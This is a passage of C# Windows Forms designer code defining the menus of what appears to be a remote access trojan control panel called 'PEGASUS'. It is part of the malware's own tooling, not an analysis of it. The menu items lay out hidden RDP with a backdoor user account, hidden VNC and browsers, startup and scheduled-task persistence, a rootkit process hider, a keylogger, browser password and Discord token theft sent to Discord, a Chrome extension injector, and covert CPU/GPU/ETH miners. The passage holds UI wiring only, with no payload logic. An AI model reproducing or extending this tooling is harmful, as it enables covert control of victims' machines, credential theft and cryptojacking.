            this.toolStripMenuItem36.Click += new System.EventHandler(this.RestartToolStripMenuItem1_Click);
            // 
            // toolStripMenuItem37
            // 
            this.toolStripMenuItem37.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem37.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem37.Name = "toolStripMenuItem37";
            this.toolStripMenuItem37.Size = new System.Drawing.Size(169, 24);
            this.toolStripMenuItem37.Text = "Update";
            this.toolStripMenuItem37.Click += new System.EventHandler(this.UPDATEToolStripMenuItem1_Click);
            // 
            // toolStripMenuItem38
            // 
            this.toolStripMenuItem38.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem38.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem38.Name = "toolStripMenuItem38";
            this.toolStripMenuItem38.Size = new System.Drawing.Size(169, 24);
            this.toolStripMenuItem38.Text = "Uninstall";
            this.toolStripMenuItem38.Click += new System.EventHandler(this.UninstallToolStripMenuItem_Click);
            // 
            // toolStripMenuItem39
            // 
            this.toolStripMenuItem39.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem39.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem39.Name = "toolStripMenuItem39";
            this.toolStripMenuItem39.Size = new System.Drawing.Size(169, 24);
            this.toolStripMenuItem39.Text = "Client Folder";
            this.toolStripMenuItem39.Click += new System.EventHandler(this.ClientFolderToolStripMenuItem_Click);
            // 
            // hiddenRDPToolStripMenuItem
            // 
            this.hiddenRDPToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.HRDPconnectToolStripMenuItem,
            this.addUserPEGASUSPEGASUSToolStripMenuItem,
            this.connectToolStripMenuItem,
            this.copyProfileToolStripMenuItem,
            this.HRDPcleanUnistallToolStripMenuItem});
            this.hiddenRDPToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.hiddenRDPToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("hiddenRDPToolStripMenuItem.Image")));
            this.hiddenRDPToolStripMenuItem.Name = "hiddenRDPToolStripMenuItem";
            this.hiddenRDPToolStripMenuItem.Size = new System.Drawing.Size(353, 36);
            this.hiddenRDPToolStripMenuItem.Text = "      [Hidden RDP (Admin needed)]";
            // 
            // HRDPconnectToolStripMenuItem
            // 
            this.HRDPconnectToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.HRDPconnectToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.HRDPconnectToolStripMenuItem.Name = "HRDPconnectToolStripMenuItem";
            this.HRDPconnectToolStripMenuItem.Size = new System.Drawing.Size(304, 24);
            this.HRDPconnectToolStripMenuItem.Text = "1. Install";
            this.HRDPconnectToolStripMenuItem.ToolTipText = "This tool can be used only in 1 pc at the time!\r\nTo use this on other user you wi" +
    "ll have first\r\nto remove/unnistall from any other user or \r\njust buy a ngrok api" +
    " for multi connections!";
            this.HRDPconnectToolStripMenuItem.Click += new System.EventHandler(this.HRDPconnectToolStripMenuItem_Click);
            // 
            // addUserPEGASUSPEGASUSToolStripMenuItem
            // 
            this.addUserPEGASUSPEGASUSToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.addUserPEGASUSPEGASUSToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.addUserPEGASUSPEGASUSToolStripMenuItem.Name = "addUserPEGASUSPEGASUSToolStripMenuItem";
            this.addUserPEGASUSPEGASUSToolStripMenuItem.Size = new System.Drawing.Size(304, 24);
            this.addUserPEGASUSPEGASUSToolStripMenuItem.Text = "2. Add User PEGASUS/PEGASUS";
            this.addUserPEGASUSPEGASUSToolStripMenuItem.Click += new System.EventHandler(this.addUserPEGASUSPEGASUSToolStripMenuItem_Click);
            // 
            // connectToolStripMenuItem
            // 
            this.connectToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.connectToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.connectToolStripMenuItem.Name = "connectToolStripMenuItem";
            this.connectToolStripMenuItem.Size = new System.Drawing.Size(304, 24);
            this.connectToolStripMenuItem.Text = "3. Connect";
            this.connectToolStripMenuItem.Click += new System.EventHandler(this.connectToolStripMenuItem_Click_1);
            // 
            // copyProfileToolStripMenuItem
            // 
            this.copyProfileToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.copyProfileToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.copyProfileToolStripMenuItem.Name = "copyProfileToolStripMenuItem";
            this.copyProfileToolStripMenuItem.Size = new System.Drawing.Size(304, 24);
            this.copyProfileToolStripMenuItem.Text = "4. Copy Profile";
            this.copyProfileToolStripMenuItem.Click += new System.EventHandler(this.copyProfileToolStripMenuItem_Click);
            // 
            // HRDPcleanUnistallToolStripMenuItem
            // 
            this.HRDPcleanUnistallToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.HRDPcleanUnistallToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.HRDPcleanUnistallToolStripMenuItem.Name = "HRDPcleanUnistallToolStripMenuItem";
            this.HRDPcleanUnistallToolStripMenuItem.Size = new System.Drawing.Size(304, 24);
            this.HRDPcleanUnistallToolStripMenuItem.Text = "  Remove";
            this.HRDPcleanUnistallToolStripMenuItem.Click += new System.EventHandler(this.HRDPcleanUnistallToolStripMenuItem_Click);
            // 
            // hVNChBrowsersToolStripMenuItem
            // 
            this.hVNChBrowsersToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.connectToolStripMenuItem1});
            this.hVNChBrowsersToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.hVNChBrowsersToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("hVNChBrowsersToolStripMenuItem.Image")));
            this.hVNChBrowsersToolStripMenuItem.Name = "hVNChBrowsersToolStripMenuItem";
            this.hVNChBrowsersToolStripMenuItem.Size = new System.Drawing.Size(353, 36);
            this.hVNChBrowsersToolStripMenuItem.Text = "      [hVNC/hBrowsers]";
            // 
            // connectToolStripMenuItem1
            // 
            this.connectToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.connectToolStripMenuItem1.ForeColor = System.Drawing.Color.WhiteSmoke;
            this.connectToolStripMenuItem1.Name = "connectToolStripMenuItem1";
            this.connectToolStripMenuItem1.Size = new System.Drawing.Size(180, 24);
            this.connectToolStripMenuItem1.Text = "Connect";
            this.connectToolStripMenuItem1.ToolTipText = "After press connect just open your hvnc panel !";
            this.connectToolStripMenuItem1.Click += new System.EventHandler(this.connectToolStripMenuItem1_Click_1);
            // 
            // toolStripMenuItem49
            // 
            this.toolStripMenuItem49.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripMenuItem50,
            this.toolStripMenuItem52,
            this.taskMgrDogToolStripMenuItem,
            this.watchDogToolStripMenuItem,
            this.hIDEPEGASUSPROCESSToolStripMenuItem});
            this.toolStripMenuItem49.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem49.Image = ((System.Drawing.Image)(resources.GetObject("toolStripMenuItem49.Image")));
            this.toolStripMenuItem49.ImageTransparentColor = System.Drawing.Color.Transparent;
            this.toolStripMenuItem49.Name = "toolStripMenuItem49";
            this.toolStripMenuItem49.Size = new System.Drawing.Size(353, 36);
            this.toolStripMenuItem49.Text = "      [Persistence/Startup/Task]";
            // 
            // toolStripMenuItem50
            // 
            this.toolStripMenuItem50.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem50.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripMenuItem51,
            this.addPEGASUSSheduleTaskToolStripMenuItem});
            this.toolStripMenuItem50.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem50.Name = "toolStripMenuItem50";
            this.toolStripMenuItem50.Size = new System.Drawing.Size(274, 24);
            this.toolStripMenuItem50.Text = "Add PEGASUS Shedule Task";
            // 
            // toolStripMenuItem51
            // 
            this.toolStripMenuItem51.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem51.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem51.Name = "toolStripMenuItem51";
            this.toolStripMenuItem51.Size = new System.Drawing.Size(274, 24);
            this.toolStripMenuItem51.Text = "Remove PEGASUS Task";
            this.toolStripMenuItem51.Click += new System.EventHandler(this.toolStripMenuItem51_Click);
            // 
            // addPEGASUSSheduleTaskToolStripMenuItem
            // 
            this.addPEGASUSSheduleTaskToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.addPEGASUSSheduleTaskToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.addPEGASUSSheduleTaskToolStripMenuItem.Name = "addPEGASUSSheduleTaskToolStripMenuItem";
            this.addPEGASUSSheduleTaskToolStripMenuItem.Size = new System.Drawing.Size(274, 24);
            this.addPEGASUSSheduleTaskToolStripMenuItem.Text = "Add PEGASUS Shedule Task";
            this.addPEGASUSSheduleTaskToolStripMenuItem.Click += new System.EventHandler(this.SchtaskInstallToolStripMenuItem_Click);
            // 
            // toolStripMenuItem52
            // 
            this.toolStripMenuItem52.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem52.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripMenuItem53,
            this.addPEGASUSToStartupToolStripMenuItem});
            this.toolStripMenuItem52.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem52.Name = "toolStripMenuItem52";
            this.toolStripMenuItem52.Size = new System.Drawing.Size(274, 24);
            this.toolStripMenuItem52.Text = "Add PEGASUS Startup";
            // 
            // toolStripMenuItem53
            // 
            this.toolStripMenuItem53.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem53.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem53.Name = "toolStripMenuItem53";
            this.toolStripMenuItem53.Size = new System.Drawing.Size(302, 24);
            this.toolStripMenuItem53.Text = "Remove PEGASUS from Startup";
            this.toolStripMenuItem53.Click += new System.EventHandler(this.toolStripMenuItem53_Click);
            // 
            // addPEGASUSToStartupToolStripMenuItem
            // 
            this.addPEGASUSToStartupToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.addPEGASUSToStartupToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.addPEGASUSToStartupToolStripMenuItem.Name = "addPEGASUSToStartupToolStripMenuItem";
            this.addPEGASUSToStartupToolStripMenuItem.Size = new System.Drawing.Size(302, 24);
            this.addPEGASUSToStartupToolStripMenuItem.Text = "Add PEGASUS to Startup";
            this.addPEGASUSToStartupToolStripMenuItem.Click += new System.EventHandler(this.normalInstallToolStripMenuItem_Click);
            // 
            // taskMgrDogToolStripMenuItem
            // 
            this.taskMgrDogToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.taskMgrDogToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.startToolStripMenuItem4,
            this.stopToolStripMenuItem4});
            this.taskMgrDogToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.taskMgrDogToolStripMenuItem.Name = "taskMgrDogToolStripMenuItem";
            this.taskMgrDogToolStripMenuItem.Size = new System.Drawing.Size(274, 24);
            this.taskMgrDogToolStripMenuItem.Text = "TaskMgrDog";
            // 
            // startToolStripMenuItem4
            // 
            this.startToolStripMenuItem4.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.startToolStripMenuItem4.ForeColor = System.Drawing.Color.LightGray;
            this.startToolStripMenuItem4.Name = "startToolStripMenuItem4";
            this.startToolStripMenuItem4.Size = new System.Drawing.Size(110, 24);
            this.startToolStripMenuItem4.Text = "Start";
            this.startToolStripMenuItem4.Click += new System.EventHandler(this.startToolStripMenuItem4_Click);
            // 
            // stopToolStripMenuItem4
            // 
            this.stopToolStripMenuItem4.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.stopToolStripMenuItem4.ForeColor = System.Drawing.Color.LightGray;
            this.stopToolStripMenuItem4.Name = "stopToolStripMenuItem4";
            this.stopToolStripMenuItem4.Size = new System.Drawing.Size(110, 24);
            this.stopToolStripMenuItem4.Text = "Stop";
            this.stopToolStripMenuItem4.Click += new System.EventHandler(this.stopToolStripMenuItem4_Click);
            // 
            // watchDogToolStripMenuItem
            // 
            this.watchDogToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.watchDogToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.startToolStripMenuItem3,
            this.stopToolStripMenuItem2});
            this.watchDogToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.watchDogToolStripMenuItem.Name = "watchDogToolStripMenuItem";
            this.watchDogToolStripMenuItem.Size = new System.Drawing.Size(274, 24);
            this.watchDogToolStripMenuItem.Text = "WatchDog";
            // 
            // startToolStripMenuItem3
            // 
            this.startToolStripMenuItem3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.startToolStripMenuItem3.ForeColor = System.Drawing.Color.LightGray;
            this.startToolStripMenuItem3.Name = "startToolStripMenuItem3";
            this.startToolStripMenuItem3.Size = new System.Drawing.Size(110, 24);
            this.startToolStripMenuItem3.Text = "Start";
            this.startToolStripMenuItem3.Click += new System.EventHandler(this.startToolStripMenuItem3_Click);
            // 
            // stopToolStripMenuItem2
            // 
            this.stopToolStripMenuItem2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.stopToolStripMenuItem2.ForeColor = System.Drawing.Color.LightGray;
            this.stopToolStripMenuItem2.Name = "stopToolStripMenuItem2";
            this.stopToolStripMenuItem2.Size = new System.Drawing.Size(110, 24);
            this.stopToolStripMenuItem2.Text = "Stop";
            this.stopToolStripMenuItem2.Click += new System.EventHandler(this.stopToolStripMenuItem2_Click_1);
            // 
            // hIDEPEGASUSPROCESSToolStripMenuItem
            // 
            this.hIDEPEGASUSPROCESSToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.hIDEPEGASUSPROCESSToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripMenuItem82,
            this.toolStripMenuItem83});
            this.hIDEPEGASUSPROCESSToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.hIDEPEGASUSPROCESSToolStripMenuItem.Name = "hIDEPEGASUSPROCESSToolStripMenuItem";
            this.hIDEPEGASUSPROCESSToolStripMenuItem.Size = new System.Drawing.Size(274, 24);
            this.hIDEPEGASUSPROCESSToolStripMenuItem.Text = "RootKit";
            // 
            // toolStripMenuItem82
            // 
            this.toolStripMenuItem82.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem82.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem82.Name = "toolStripMenuItem82";
            this.toolStripMenuItem82.Size = new System.Drawing.Size(110, 24);
            this.toolStripMenuItem82.Text = "Start";
            this.toolStripMenuItem82.Click += new System.EventHandler(this.toolStripMenuItem82_Click);
            // 
            // toolStripMenuItem83
            // 
            this.toolStripMenuItem83.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem83.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem83.Name = "toolStripMenuItem83";
            this.toolStripMenuItem83.Size = new System.Drawing.Size(110, 24);
            this.toolStripMenuItem83.Text = "Stop";
            this.toolStripMenuItem83.Click += new System.EventHandler(this.toolStripMenuItem83_Click);
            // 
            // passwordRecoveryToolStripMenuItem
            // 
            this.passwordRecoveryToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripMenuItem31,
            this.sKYNETToolStripMenuItem,
            this.recoverAllSendToDiscordToolStripMenuItem,
            this.toolStripMenuItem80,
            this.discordStealerToolStripMenuItem,
            this.kATANAToolStripMenuItem,
            this.chromeExtentionStealerToolStripMenuItem});
            this.passwordRecoveryToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.passwordRecoveryToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("passwordRecoveryToolStripMenuItem.Image")));
            this.passwordRecoveryToolStripMenuItem.Name = "passwordRecoveryToolStripMenuItem";
            this.passwordRecoveryToolStripMenuItem.Size = new System.Drawing.Size(353, 36);
            this.passwordRecoveryToolStripMenuItem.Text = "      [Password Recovery/Keylogger]";
            // 
            // toolStripMenuItem31
            // 
            this.toolStripMenuItem31.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem31.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem31.Name = "toolStripMenuItem31";
            this.toolStripMenuItem31.Size = new System.Drawing.Size(291, 24);
            this.toolStripMenuItem31.Text = "Password Recovery";
            this.toolStripMenuItem31.Click += new System.EventHandler(this.PasswordRecoveryToolStripMenuItem_Click);
            // 
            // sKYNETToolStripMenuItem
            // 
            this.sKYNETToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.sKYNETToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.sKYNETToolStripMenuItem.Name = "sKYNETToolStripMenuItem";
            this.sKYNETToolStripMenuItem.Size = new System.Drawing.Size(291, 24);
            this.sKYNETToolStripMenuItem.Text = "Skynet Recovery All Browsers";
            this.sKYNETToolStripMenuItem.Visible = false;
            this.sKYNETToolStripMenuItem.Click += new System.EventHandler(this.sKYNETToolStripMenuItem_Click);
            // 
            // recoverAllSendToDiscordToolStripMenuItem
            // 
            this.recoverAllSendToDiscordToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.recoverAllSendToDiscordToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.recoverAllSendToDiscordToolStripMenuItem.Name = "recoverAllSendToDiscordToolStripMenuItem";
            this.recoverAllSendToDiscordToolStripMenuItem.Size = new System.Drawing.Size(291, 24);
            this.recoverAllSendToDiscordToolStripMenuItem.Text = "Recover All & Send to Discord";
            this.recoverAllSendToDiscordToolStripMenuItem.Click += new System.EventHandler(this.recoverAllSendToDiscordToolStripMenuItem_Click);
            // 
            // toolStripMenuItem80
            // 
            this.toolStripMenuItem80.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem80.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem80.Name = "toolStripMenuItem80";
            this.toolStripMenuItem80.Size = new System.Drawing.Size(291, 24);
            this.toolStripMenuItem80.Text = "Keylogger";
            this.toolStripMenuItem80.Click += new System.EventHandler(this.KeyloggerToolStripMenuItem1_Click);
            // 
            // discordStealerToolStripMenuItem
            // 
            this.discordStealerToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.discordStealerToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.discordStealerToolStripMenuItem.Name = "discordStealerToolStripMenuItem";
            this.discordStealerToolStripMenuItem.Size = new System.Drawing.Size(291, 24);
            this.discordStealerToolStripMenuItem.Text = "Discord Token Recovery";
            this.discordStealerToolStripMenuItem.Click += new System.EventHandler(this.discordStealerToolStripMenuItem_Click);
            // 
            // kATANAToolStripMenuItem
            // 
            this.kATANAToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.kATANAToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.kATANAToolStripMenuItem.Name = "kATANAToolStripMenuItem";
            this.kATANAToolStripMenuItem.Size = new System.Drawing.Size(291, 24);
            this.kATANAToolStripMenuItem.Text = "Katana";
            this.kATANAToolStripMenuItem.Click += new System.EventHandler(this.kATANAToolStripMenuItem_Click);
            // 
            // chromeExtentionStealerToolStripMenuItem
            // 
            this.chromeExtentionStealerToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.chromeExtentionStealerToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.chromeExtentionStealerToolStripMenuItem.Name = "chromeExtentionStealerToolStripMenuItem";
            this.chromeExtentionStealerToolStripMenuItem.Size = new System.Drawing.Size(291, 24);
            this.chromeExtentionStealerToolStripMenuItem.Text = "Chrome Extension Injector";
            this.chromeExtentionStealerToolStripMenuItem.Visible = false;
            this.chromeExtentionStealerToolStripMenuItem.Click += new System.EventHandler(this.chromeExtentionStealerToolStripMenuItem_Click);
            // 
            // toolStripMenuItem56
            // 
            this.toolStripMenuItem56.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.cPUMinerToolStripMenuItem,
            this.gPUMinerToolStripMenuItem,
            this.remoteMinerToolStripMenuItem1});
            this.toolStripMenuItem56.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem56.Image = ((System.Drawing.Image)(resources.GetObject("toolStripMenuItem56.Image")));
            this.toolStripMenuItem56.ImageTransparentColor = System.Drawing.Color.Transparent;
            this.toolStripMenuItem56.Name = "toolStripMenuItem56";
            this.toolStripMenuItem56.Size = new System.Drawing.Size(353, 36);
            this.toolStripMenuItem56.Text = "      [Remote Miners]";
            // 
            // cPUMinerToolStripMenuItem
            // 
            this.cPUMinerToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.cPUMinerToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.startToolStripMenuItem1,
            this.stopToolStripMenuItem1,
            this.deleteToolStripMenuItem});
            this.cPUMinerToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.cPUMinerToolStripMenuItem.Name = "cPUMinerToolStripMenuItem";
            this.cPUMinerToolStripMenuItem.Size = new System.Drawing.Size(157, 24);
            this.cPUMinerToolStripMenuItem.Text = "CPU Miner";
            this.cPUMinerToolStripMenuItem.Visible = false;
            // 
            // startToolStripMenuItem1
            // 
            this.startToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.startToolStripMenuItem1.ForeColor = System.Drawing.Color.LightGray;
            this.startToolStripMenuItem1.Name = "startToolStripMenuItem1";
            this.startToolStripMenuItem1.Size = new System.Drawing.Size(127, 24);
            this.startToolStripMenuItem1.Text = "Start";
            this.startToolStripMenuItem1.Click += new System.EventHandler(this.startToolStripMenuItem1_Click_2);
            // 
            // stopToolStripMenuItem1
            // 
            this.stopToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.stopToolStripMenuItem1.ForeColor = System.Drawing.Color.LightGray;
            this.stopToolStripMenuItem1.Name = "stopToolStripMenuItem1";
            this.stopToolStripMenuItem1.Size = new System.Drawing.Size(127, 24);
            this.stopToolStripMenuItem1.Text = "Stop";
            this.stopToolStripMenuItem1.Click += new System.EventHandler(this.stopToolStripMenuItem1_Click_2);
            // 
            // deleteToolStripMenuItem
            // 
            this.deleteToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.deleteToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.deleteToolStripMenuItem.Name = "deleteToolStripMenuItem";
            this.deleteToolStripMenuItem.Size = new System.Drawing.Size(127, 24);
            this.deleteToolStripMenuItem.Text = "Delete";
            this.deleteToolStripMenuItem.Click += new System.EventHandler(this.deleteToolStripMenuItem_Click);
            // 
            // gPUMinerToolStripMenuItem
            // 
            this.gPUMinerToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.gPUMinerToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.startToolStripMenuItem5,
            this.stopToolStripMenuItem6,
            this.deleteToolStripMenuItem1});
            this.gPUMinerToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.gPUMinerToolStripMenuItem.Name = "gPUMinerToolStripMenuItem";
            this.gPUMinerToolStripMenuItem.Size = new System.Drawing.Size(157, 24);
            this.gPUMinerToolStripMenuItem.Text = "GPU Miner";
            this.gPUMinerToolStripMenuItem.Visible = false;
            // 
            // startToolStripMenuItem5
            // 
            this.startToolStripMenuItem5.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.startToolStripMenuItem5.ForeColor = System.Drawing.Color.LightGray;
            this.startToolStripMenuItem5.Name = "startToolStripMenuItem5";
            this.startToolStripMenuItem5.Size = new System.Drawing.Size(127, 24);
            this.startToolStripMenuItem5.Text = "Start";
            this.startToolStripMenuItem5.Click += new System.EventHandler(this.startToolStripMenuItem5_Click);
            // 
            // stopToolStripMenuItem6
            // 
            this.stopToolStripMenuItem6.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.stopToolStripMenuItem6.ForeColor = System.Drawing.Color.LightGray;
            this.stopToolStripMenuItem6.Name = "stopToolStripMenuItem6";
            this.stopToolStripMenuItem6.Size = new System.Drawing.Size(127, 24);
            this.stopToolStripMenuItem6.Text = "Stop";
            this.stopToolStripMenuItem6.Click += new System.EventHandler(this.stopToolStripMenuItem6_Click);
            // 
            // deleteToolStripMenuItem1
            // 
            this.deleteToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.deleteToolStripMenuItem1.ForeColor = System.Drawing.Color.LightGray;
            this.deleteToolStripMenuItem1.Name = "deleteToolStripMenuItem1";
            this.deleteToolStripMenuItem1.Size = new System.Drawing.Size(127, 24);
            this.deleteToolStripMenuItem1.Text = "Delete";
            this.deleteToolStripMenuItem1.Click += new System.EventHandler(this.deleteToolStripMenuItem1_Click);
            // 
            // remoteMinerToolStripMenuItem1
            // 
            this.remoteMinerToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.remoteMinerToolStripMenuItem1.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.MinerstartToolStripMenuItem1,
            this.MinerstopToolStripMenuItem1});
            this.remoteMinerToolStripMenuItem1.ForeColor = System.Drawing.Color.LightGray;
            this.remoteMinerToolStripMenuItem1.Name = "remoteMinerToolStripMenuItem1";
            this.remoteMinerToolStripMenuItem1.Size = new System.Drawing.Size(157, 24);
            this.remoteMinerToolStripMenuItem1.Text = "ETH Miner";
            // 
            // MinerstartToolStripMenuItem1
            // 
            this.MinerstartToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.MinerstartToolStripMenuItem1.ForeColor = System.Drawing.Color.LightGray;
            this.MinerstartToolStripMenuItem1.Name = "MinerstartToolStripMenuItem1";
            this.MinerstartToolStripMenuItem1.Size = new System.Drawing.Size(110, 24);
            this.MinerstartToolStripMenuItem1.Text = "Start";
            this.MinerstartToolStripMenuItem1.Click += new System.EventHandler(this.MinerstartToolStripMenuItem1_Click);
            // 
            // MinerstopToolStripMenuItem1
            // 
